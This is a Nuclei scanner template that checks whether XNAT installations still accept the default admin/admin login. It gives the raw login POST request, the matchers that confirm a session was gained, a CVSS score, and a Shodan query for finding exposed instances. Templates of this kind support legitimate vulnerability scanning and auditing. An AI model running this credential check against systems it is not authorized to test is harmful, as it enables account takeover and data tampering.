http:
- attack: pitchfork
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - app/template/Index.vm?login=true
    - JSESSIONID
  - status:
    - 302
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    login_method=localdb&username={{username}}&password={{password}}&login=&XNAT_CSRF=

    '
id: xnat-default-login
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:xnat:xnat:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: XNAT contains an admin default login vulnerability. An attacker can
    obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 1
    product: xnat
    shodan-query: http.title:"XNAT"
    vendor: xnat
    verified: true
  name: XNAT - Default Login
  reference:
  - https://wiki.xnat.org/documentation/xnat-administration/xnat-setup-first-time-configuration#:~:text=Log%20in%20with%20the%20username%20admin%20and%20password%20admin
  severity: high
  tags: default-login,xnat,vuln
